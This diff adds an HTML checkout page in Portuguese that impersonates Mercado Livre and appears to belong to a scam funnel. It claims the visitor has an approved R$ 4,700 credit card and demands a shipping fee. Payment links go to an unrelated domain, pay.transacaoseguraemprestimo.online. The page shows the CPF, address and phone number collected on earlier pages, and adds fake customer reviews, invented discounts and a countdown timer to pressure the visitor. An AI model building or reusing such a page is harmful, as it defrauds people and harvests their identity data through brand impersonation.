@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Pagamento</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <script src="js/utmify-tracker.js"></script>
+    <script src="js/utmify-pixel-tiktok.js"></script>
+    <script src="js/tiktok-pixel-shop.js"></script>
+    <script>
+        window.CHECKOUT_CONFIG = {
+            pagouPublicKey: "pk_live_1JGBsVxl-CDKDVE68DB5lvSy-hgkV-o1pwsauMBoVtc",
+            pagouEnvironment: "production",
+            checkoutApiUrl: "api/checkout-transaction.php",
+            checkoutStatusApiUrl: "api/pagou-status.php",
+            productId: "ml-cartao-taxa-frete",
+            productName: "Cartão Mercado Livre — taxa e adicionais",
+            priceReais: 0,
+            pagouNotifyUrl: (function () {
+                try { return new URL("api/pagou-webhook.php", window.location.href).href; } catch (e) { return undefined; }
+            })()
+        };
+    </script>
+    <style>
+        .ch-page {
+            background: #f5f5f5;
+            min-height: calc(100vh - 56px);
+            padding: 0 0 40px;
+        }
+
+        .ch-pad {
+            padding: 12px 14px;
+        }
+
+        .ch-title {
+            font-size: 19px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a1a;
+            margin-bottom: 14px;
+            line-height: 1.3;
+        }
+
+        .ch-limit {
+            text-align: center;
+            margin-bottom: 14px;
+        }
+
+        .ch-limit .a {
+            font-size: 15px;
+            font-weight: 800;
+            color: #333;
+        }
+
+        .ch-limit .b {
+            font-size: 32px;
+            font-weight: 800;
+            color: #1a1a1a;
+            letter-spacing: -0.5px;
+            margin: 2px 0;
+        }
+
+        .ch-limit .c {
+            font-size: 13px;
+            color: #a6632e;
+        }
+
+        .ch-frame {
+            background: #ffe600;
+            border-radius: 16px;
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            text-align: center;
+            min-height: 240px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .ch-frame img {
+            width: 100%;
+            max-width: 100%;
+            max-height: min(320px, 78vw);
+            height: auto;
+            object-fit: contain;
+        }
+
+        .ch-ph {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+            padding: 12px;
+        }
+
+        .ch-card {
+            background: #fff;
+            border: 1px solid #e8e8e8;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+
+        .ch-card h2,
+        .ch-h2 {
+            font-size: 15px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+        }
+
+        .ch-center {
+            text-align: center;
+        }
+
+        .ch-center p {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .addr-lines {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.55;
+        }
+
+        .addr-lines strong {
+            display: block;
+            margin-top: 8px;
+            font-size: 13px;
+        }
+
+        .rec-line {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-bottom: 6px;
+            gap: 8px;
+        }
+
+        .rec-line span:first-child {
+            color: #666;
+            flex-shrink: 0;
+        }
+
+        .add-item {
+            position: relative;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 12px 12px 12px 44px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            background: #fff;
+        }
+
+        .add-item.selected {
+            border-color: #3483fa;
+        }
+
+        .add-check {
+            position: absolute;
+            left: 12px;
+            top: 14px;
+            width: 22px;
+            height: 22px;
+            border: 2px solid #ccc;
+            border-radius: 50%;
+        }
+
+        .add-item.selected .add-check {
+            background: #3483fa;
+            border-color: #3483fa;
+        }
+
+        .add-item.selected .add-check::after {
+            content: "✓";
+            color: #fff;
+            font-size: 13px;
+            font-weight: 800;
+            display: block;
+            text-align: center;
+            line-height: 18px;
+        }
+
+        .add-h {
+            display: flex;
+            justify-content: space-between;
+            font-weight: 800;
+            font-size: 14px;
+        }
+
+        .add-d {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+            margin-top: 4px;
+        }
+
+        .add-badge {
+            position: absolute;
+            right: 10px;
+            bottom: 8px;
+            font-size: 9px;
+            font-weight: 800;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .add-link {
+            color: #3483fa;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        .struck {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .sum-inner {
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 14px;
+        }
+
+        .sum-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+
+        .total-block {
+            background: #e6f4ea;
+            border-radius: 10px;
+            padding: 14px;
+            margin-top: 12px;
+        }
+
+        .total-l {
+            font-size: 13px;
+            font-weight: 800;
+        }
+
+        .total-r {
+            font-size: 24px;
+            font-weight: 800;
+        }
+
+        .desc-green {
+            font-size: 12px;
+            color: #2e7d32;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        .urgent {
+            background: #ffebee;
+            border: 1px solid #ffcdd2;
+            border-radius: 10px;
+            padding: 14px;
+            text-align: center;
+            color: #c62828;
+            font-size: 12px;
+            margin: 12px 0;
+        }
+
+        .urgent .tm {
+            font-size: 22px;
+            font-weight: 800;
+            display: block;
+        }
+
+        .btn-gerar {
+            width: 100%;
+            font-weight: 800;
+            font-size: 15px;
+        }
+
+        .reembolso {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+        }
+
+        #pixPanel {
+            display: none;
+            margin: 0 14px;
+        }
+
+        .pix-load {
+            text-align: center;
+            padding: 24px;
+            background: #fff;
+            border-radius: 12px;
+            border: 1px solid #eee;
+        }
+
+        .pix-qr {
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .pix-qr img {
+            width: min(220px, 100%);
+            height: auto;
+        }
+
+        .pix-qr .ph-qr {
+            width: 220px;
+            max-width: 100%;
+            min-height: 200px;
+            margin: 0 auto;
+            background: #f5f5f5;
+            border: 1px dashed #ccc;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            color: #999;
+        }
+
+        .pix-load .s {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #eee;
+            border-top-color: #ffe600;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        .pix-box {
+            background: #fff;
+            border: 1px solid #e8e8e8;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+
+        .pix-pills {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin: 10px 0;
+        }
+
+        .pix-pill {
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 6px 10px;
+            font-size: 11px;
+        }
+
+        .trust-row {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+        }
+
+        .trust-row img {
+            max-height: 32px;
+            object-fit: contain;
+        }
+
+        .trust-ph {
+            font-size: 10px;
+            color: #999;
+            text-align: center;
+            width: 100%;
+        }
+
+        .lock-line {
+            text-align: center;
+            color: #00a650;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .info-amb {
+            background: #eef1ee;
+            border: 1px solid #c8d6c9;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 11px;
+            color: #555;
+            line-height: 1.45;
+        }
+
+        .pix-adq {
+            background: #e3f2fd;
+            border: 1px solid #90caf9;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 12px;
+            color: #1565c0;
+            display: flex;
+            gap: 8px;
+            align-items: flex-start;
+            margin: 10px 0;
+        }
+
+        .pix-adq b {
+            color: #0d47a1;
+        }
+
+        .lbl-cod {
+            font-size: 11px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            margin-bottom: 4px;
+        }
+
+        .box-cod {
+            background: #fff;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 10px;
+            word-break: break-all;
+            line-height: 1.4;
+            min-height: 60px;
+        }
+
+        .btn-copy {
+            margin-top: 8px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #fff;
+            border: 1px solid #ccc;
+            color: #1a1a1a;
+            font-weight: 600;
+            border-radius: 8px;
+            padding: 12px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .passo-box {
+            background: #fafafa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 12px;
+            color: #444;
+            line-height: 1.55;
+            margin-top: 12px;
+        }
+
+        .passo-box a {
+            color: #3483fa;
+        }
+
+        .sec-h {
+            font-size: 16px;
+            font-weight: 800;
+            color: #333;
+            margin: 20px 0 12px;
+        }
+
+        .fotos-row {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            margin-bottom: 8px;
+            padding-bottom: 4px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .foto-ph {
+            flex: 1;
+            min-width: 0;
+            aspect-ratio: 3 / 4;
+            max-height: 200px;
+            border-radius: 10px;
+            background: #e0e0e0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .foto-ph img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
+            display: block;
+        }
+
+        .rev-card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 8px;
+        }
+
+        .rev-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-bottom: 4px;
+        }
+
+        .rev-name {
+            font-weight: 800;
+            font-size: 14px;
+        }
+
+        .rev-meta {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .stars {
+            color: #ffc107;
+            font-size: 12px;
+            letter-spacing: 0;
+        }
+
+        #btnGerarPix:disabled {
+            opacity: 0.55;
+            cursor: not-allowed;
+            filter: grayscale(0.2);
+        }
+
+        .ml-warn {
+            border: 1px solid #ffcdd2;
+            background: #fff8f5;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 14px;
+        }
+
+        .ml-warn h3 {
+            font-size: 15px;
+            font-weight: 800;
+            color: #b71c1c;
+            margin: 0 0 8px;
+        }
+
+        .ml-warn p {
+            font-size: 14px;
+            color: #5d4037;
+            margin: 0 0 10px;
+            line-height: 1.45;
+        }
+
+        .ml-warn-ok {
+            border-color: #a5d6a7;
+            background: #f1f8e9;
+        }
+
+        .ml-warn-ok h3 {
+            color: #1b5e20;
+        }
+
+        .ml-warn-ok p {
+            color: #33691e;
+        }
+
+        .ch-pay-methods {
+            display: flex;
+            gap: 10px;
+            margin: 0 0 14px;
+            justify-content: center;
+        }
+
+        .payment-method-btn {
+            flex: 1;
+            max-width: 200px;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: #fff;
+            font-weight: 800;
+            font-size: 14px;
+            cursor: pointer;
+            color: #333;
+        }
+
+        .payment-method-btn--active {
+            border-color: #3483fa;
+            background: #e3f2fd;
+            color: #1565c0;
+        }
+
+        /* Estilos específicos para o formulário de cartão */
+        .card-fields {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .card-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .card-input-group label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .card-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .card-input-wrapper input {
+            width: 100%;
+            padding: 12px;
+            padding-right: 40px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .card-input-wrapper input:focus {
+            border-color: #3483fa;
+        }
+
+        .card-logos {
+            position: absolute;
+            right: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            pointer-events: none;
+        }
+
+        .card-logos img {
+            height: 18px;
+            width: auto;
+        }
+
+        .card-logos span {
+            font-size: 12px;
+            color: #999;
+            font-weight: 600;
+        }
+
+        .card-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .card-row .card-input-group {
+            flex: 1;
+        }
+
+        .cvv-icon {
+            position: absolute;
+            right: 12px;
+            color: #3483fa;
+            display: flex;
+            align-items: center;
+        }
+
+        .js-payment-pane-pix,
+        .js-payment-pane-card {
+            width: 100%;
+        }
+
+        .js-payment-pane-card .pagou-card-hint {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.45;
+            margin: 0 0 8px;
+        }
+
+        #pagou-card-element {
+            min-height: 52px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 10px 0;
+            background: #fafafa;
+        }
+
+        .pix-qr {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            width: 100%;
+        }
+
+        .js-pix-qr-wrap {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            min-height: 200px;
+        }
+
+        .js-pix-qr-wrap img,
+        .js-pix-qr-wrap canvas {
+            display: block !important;
+            margin-left: auto !important;
+            margin-right: auto !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container app-container--funnel">
+        <header>
+            <a href="endereco.html" class="header-back" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                </svg>
+            </a>
+            <div class="header-logo">
+                <img src="images/Mercado-Livre-logo.png" alt="Mercado Livre" width="150" height="36">
+            </div>
+        </header>
+
+        <div class="ch-page">
+            <div class="ch-pad" id="mlCheckoutWarning" style="display:none" hidden>
+                <div class="ml-warn" id="mlWarnInner">
+                    <h3 id="mlWarnTitle">Dados incompletos</h3>
+                    <p id="mlWarnMsg">Conclua o funil (cadastro, contato, endereço) para habilitar o pagamento com
+                        segurança.</p>
+                    <p
+                        style="font-size: 13px; margin: 0; display: flex; flex-wrap: wrap; align-items: center; gap: 6px 12px;">
+                        <a href="cadastro.html" class="add-link" id="mlLnkCadastro"
+                            style="font-weight: 700;">Cadastro</a>
+                        <span style="color:#999">·</span>
+                        <a href="contato.html" class="add-link" id="mlLnkContato" style="font-weight: 700;">WhatsApp</a>
+                        <span style="color:#999">·</span>
+                        <a href="endereco.html" class="add-link" id="mlLnkEndereco" style="font-weight: 700;">Endereço e
+                            frete</a>
+                    </p>
+                </div>
+            </div>
+            <div class="ch-pad" id="checkoutBlock">
+                <h1 class="ch-title">Liberar Limite e Receber Cartão</h1>
+
+                <div class="ch-limit">
+                    <div class="a">Seu Limite Disponível</div>
+                    <div class="b">R$ 4.700</div>
+                    <div class="c">Disponível por tempo limitado nesta etapa.</div>
+                </div>
+
+                <div class="ch-frame" id="cartaoFrame">
+                    <div id="cartaoPh" class="ch-ph" style="display: none;">Adicione a arte do cartão
+                        em<br><strong>images/cartao-aprovado.webp </strong></div>
+                    <img id="cartaoImg" src="./images/cartao-aprovado.webp" alt="Cartão aprovado"
+                        onload="var p=document.getElementById('cartaoPh'); if(p)p.style.display='none';"
+                        onerror="this.style.display='none'; var p=document.getElementById('cartaoPh'); if(p)p.style.display='block';">
+                </div>
+
+                <div class="ch-card ch-center">
+                    <h2>Finalize o envio do seu cartão</h2>
+                    <p>Pague o frete para receber o cartão físico e ativar o cartão virtual agora mesmo.</p>
+                </div>
+
+                <div class="ch-card">
+                    <h2>Detalhes do Envio</h2>
+                    <div class="addr-lines" id="txEnvio">—</div>
+                </div>
+
+                <div class="ch-card" id="cardReceb">
+                    <h2>Detalhes do recebedor</h2>
+                    <div class="rec-line"><span>Nome</span><span id="rxNome" style="font-weight:600">—</span></div>
+                    <div class="rec-line"><span>CPF</span><span id="rxCpf" style="font-weight:600">—</span></div>
+                    <div class="rec-line"><span>E-mail</span><span id="rxEmail"
+                            style="font-weight:600; text-align:right;">—</span></div>
+                    <div class="rec-line"><span>Telefone</span><span id="rxTel" style="font-weight:600">—</span></div>
+                </div>
+
+
+                <div class="ch-card">
+                    <h2>Consolidado do pagamento</h2>
+                    <div class="sum-inner">
+                        <div class="sum-row"><span style="color:#666;">Entrega</span><strong id="sumEnt">Entrega
+                                FULL</strong></div>
+                        <div class="sum-row"><span style="color:#666;">Valor do Frete</span><span><strong
+                                    id="sumFrete">R$ 34,83</strong><br><span class="struck">R$ 116,10</span></span>
+                        </div>
+                        <div class="sum-row"><span style="color:#666;">Prazo</span><strong id="sumPrazo">1 dia
+                                útil</strong></div>
+                        <div class="sum-row"><span style="color:#666;">Adicionais</span><strong id="sumAdd">R$
+                                9,80</strong></div>
+                        <div class="sum-row" style="border-top:1px dashed #ccc; padding-top:6px; margin-top:4px">
+                            <span style="color:#666;">Taxa de emissão</span>
+                            <span><span style="color:#00a650; font-weight:800;">Gratuito</span><br><span
+                                    class="struck">R$ 37,90</span></span>
+                        </div>
+                    </div>
+                    <div class="total-block">
+                        <div class="total-l">Total a pagar <span style="font-size:11px; font-weight:500;">(promoção
+                                válida hoje)</span></div>
+                        <div class="total-r" id="totPag" style="margin-top:4px;">R$ 44,63</div>
+                        <div class="desc-green" id="totDesc">Desconto adquirido: R$ 169,07</div>
+                    </div>
+                </div>
+
+                <div class="urgent">
+                    <span class="tm" id="countUrgent">10:00</span>
+                    Essa oportunidade é válida apenas hoje. O não pagamento da taxa pode cancelar sua liberação.
+                </div>
+
+                <div class="pay-btn-area" style="margin-top: 20px;">
+                    <a href="#" class="btn btn-yellow btn-gerar" id="mlDynamicPayBtn" style="text-decoration: none; display: flex; align-items: center; justify-content: center; height: 52px;">
+                        Ir para pagamento — R$ 34,83
+                    </a>
+                    <p class="reembolso" aria-hidden="true">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2V5M12 19V22M2 12H5M19 12H22" stroke="currentColor" stroke-width="1.5"
+                                stroke-linecap="round" />
+                        </svg>
+                        Reembolso garantido em conta
+                    </p>
+                </div>
+
+            <div class="ch-pad" id="reviewsBlock">
+                <h2 class="sec-h" style="margin-top:0;">Fotos de clientes</h2>
+                <div class="fotos-row">
+                    <div class="foto-ph"><img src="images/card1.webp" alt="Foto de cliente 1" loading="lazy"></div>
+                    <div class="foto-ph"><img src="images/card2.webp" alt="Foto de cliente 2" loading="lazy"></div>
+                    <div class="foto-ph"><img src="images/card3.webp" alt="Foto de cliente 3" loading="lazy"></div>
+                </div>
+                <h2 class="sec-h">Comentários recentes</h2>
+                <div class="rev-card">
+                    <div class="rev-top"><span class="rev-name">Thiago M.</span><span class="stars">★★★★★</span><span
+                            class="rev-meta">Há 2 dias</span></div>
+                    <p style="font-size:14px; color:#555; margin:0; line-height:1.4;">Recebi meu cartão em menos de uma
+                        semana. Já usei pra fazer compras no mercado e funcionou perfeitamente!</p>
+                </div>
+                <div class="rev-card">
+                    <div class="rev-top"><span class="rev-name">Carlos A.</span><span class="stars">★★★★★</span><span
+                            class="rev-meta">Há 5 dias</span></div>
+                    <p style="font-size:14px; color:#555; margin:0; line-height:1.4;">Fiquei com receio no início mas
+                        chegou certinho. Bandeira Visa, cartão original, tudo ok.</p>
+                </div>
+                <div class="rev-card">
+                    <div class="rev-top"><span class="rev-name">Juliana S.</span><span class="stars">★★★★★</span><span
+                            class="rev-meta">Há 1 semana</span></div>
+                    <p style="font-size:14px; color:#555; margin:0; line-height:1.4;">Chegou rápido e já veio ativado.
+                        Limite bom e sem burocracia nenhuma. Melhor decisão!</p>
+                </div>
+                <div class="rev-card">
+                    <div class="rev-top"><span class="rev-name">Pedro H.</span><span class="stars">★★★★★</span><span
+                            class="rev-meta">Há 3 dias</span></div>
+                    <p style="font-size:14px; color:#555; margin:0; line-height:1.4;">Processo simples e rápido. Cartão
+                        chegou antes do prazo.</p>
+                </div>
+                <div class="rev-card">
+                    <div class="rev-top"><span class="rev-name">Amanda L.</span><span class="stars"
+                            style="letter-spacing:1px;">★★★★<span style="color:#e0e0e0">★</span></span><span
+                            class="rev-meta">Há 1 semana</span></div>
+                    <p style="font-size:14px; color:#555; margin:0; line-height:1.4;">Demorou uns dias mas chegou.
+                        Cartão bonito e funcionando.</p>
+                </div>
+                <div class="rev-card">
+                    <div class="rev-top"><span class="rev-name">Lucas R.</span><span class="stars">★★★★★</span><span
+                            class="rev-meta">Há 4 dias</span></div>
+                    <p style="font-size:14px; color:#555; margin:0; line-height:1.4;">Melhor cartão que já tive. Limite
+                        bom e cashback de verdade.</p>
+                </div>
+            </div>
+
+            <div class="ch-pad" id="mlFunnelSuccess" style="display:none;" hidden>
+                <div class="ch-card ch-center" style="border:2px solid #c8e6c9; background:#f1f8e9;">
+                    <h2 class="ch-title" style="color:#1b5e20;">Pagamento confirmado</h2>
+                    <p style="color:#333;">Recebemos o seu pagamento. Os próximos passos serão enviados para <strong
+                            id="mlFunnelSuccessEmail">—</strong>.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script>
+        function fmtReal(n) { return "R$ " + n.toFixed(2).replace(".", ","); }
+        function fmtEndereco() {
+            var l = sessionStorage.getItem("mlLogradouro") || "";
+            var n = sessionStorage.getItem("mlNumero") || "";
+            var c = sessionStorage.getItem("mlComplemento") || "";
+            var b = sessionStorage.getItem("mlBairro") || "";
+            var cd = sessionStorage.getItem("mlCidade") || "";
+            var uf = sessionStorage.getItem("mlUf") || "";
+            var cep = sessionStorage.getItem("mlCep") || "";
+            var lin1 = l + (n ? ", " + n : "") + (c ? " — " + c : "");
+            var lin2 = b + (b && cd ? " - " : "") + cd + (uf ? "/" + uf : "");
+            var lin3 = cep ? "CEP: " + cep : "";
+            return "<strong>Endereço de entrega:</strong>\n" + [lin1, lin2, lin3].filter(Boolean).join("\n");
+        }
+        function loadSession() {
+            var nome = sessionStorage.getItem("mlNome") || "—";
+            var email = sessionStorage.getItem("mlEmail") || "—";
+            var cpf = String(sessionStorage.getItem("mlCpf") || "—");
+            var tel = sessionStorage.getItem("mlWhatsapp") || "—";
+            if (cpf.length === 11) cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            document.getElementById("rxNome").textContent = nome;
+            document.getElementById("rxEmail").textContent = email;
+            document.getElementById("rxCpf").textContent = cpf;
+            document.getElementById("rxTel").textContent = tel;
+            var fEnt = sessionStorage.getItem("mlEntrega") || "Entrega FULL";
+            var fPrazo = sessionStorage.getItem("mlEntregaPrazo") || "1 dia útil";
+            var fv = parseFloat(sessionStorage.getItem("mlFreteValor") || "34.83");
+            document.getElementById("sumEnt").textContent = fEnt;
+            document.getElementById("sumPrazo").textContent = fPrazo;
+            if (window.mlBrlFromCents && window.mlGetFreteCents) {
+                document.getElementById("sumFrete").textContent = window.mlBrlFromCents(window.mlGetFreteCents());
+            } else {
+                document.getElementById("sumFrete").textContent = fmtReal(fv);
+            }
+            document.getElementById("txEnvio").innerHTML = fmtEndereco().replace(/\n/g, "<br>");
+        }
+        function recalc() {
+            var fv = parseFloat(sessionStorage.getItem("mlFreteValor") || "34.83");
+            var totLabel = fmtReal(fv);
+            
+            document.getElementById("sumAdd").textContent = "R$ 0,00";
+            document.getElementById("totPag").textContent = totLabel;
+            
+            var ref = 214.6;
+            var d = Math.max(0, ref - fv);
+            document.getElementById("totDesc").textContent = "Desconto adquirido: " + fmtReal(d);
+            
+            var payBtn = document.getElementById("mlDynamicPayBtn");
+            if (payBtn) {
+                payBtn.textContent = "Ir para pagamento — " + totLabel;
+                
+                // Configuração do Link Dinâmico
+                var links = {
+                    "34.83": "https://pay.transacaoseguraemprestimo.online/c/014ba975-b2eb-4fa8-af82-1d5aa1c166f3",
+                    "28.36": "https://pay.transacaoseguraemprestimo.online/c/462d97aa-0f7f-4bb3-8f47-6b4c485fac27",
+                    "17.79": "https://pay.transacaoseguraemprestimo.online/c/bdffe58f-9e3c-4bdb-b726-1ee245eda037"
+                };
+                
+                var fvStr = fv.toFixed(2);
+                var targetLink = links[fvStr] || links["34.83"];
+                
+                // Adiciona UTMs se disponíveis
+                if (window.LojaUtmify && typeof window.LojaUtmify.getUrlWithUtm === "function") {
+                    payBtn.href = window.LojaUtmify.getUrlWithUtm(targetLink);
+                } else {
+                    payBtn.href = targetLink;
+                }
+            }
+        }
+        var sec = 10 * 60;
+        setInterval(function () {
+            if (sec <= 0) return;
+            sec--;
+            var m = Math.floor(sec / 60), s2 = sec % 60;
+            var el = document.getElementById("countUrgent");
+            if (el) el.textContent = m + ":" + (s2 < 10 ? "0" : "") + s2;
+        }, 1000);
+        document.addEventListener("DOMContentLoaded", function () {
+            try {
+                if (!sessionStorage.getItem("mlNome") || !sessionStorage.getItem("mlCpf")) {
+                    window.location.replace("cadastro.html");
+                    return;
+                }
+                if (!sessionStorage.getItem("mlWhatsapp")) {
+                    window.location.replace("contato.html");
+                    return;
+                }
+                if (!sessionStorage.getItem("mlCep") || !sessionStorage.getItem("mlFreteValor")) {
+                    window.location.replace("endereco.html");
+                    return;
+                }
+            } catch (e) { }
+            loadSession();
+            recalc();
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js" crossorigin="anonymous"
+        referrerpolicy="no-referrer"></script>
+    <script src="https://js.pagou.ai/payments/v3.js"></script>
+    <script src="js/checkout-pagou.js"></script>
+</body>
+
+</html>
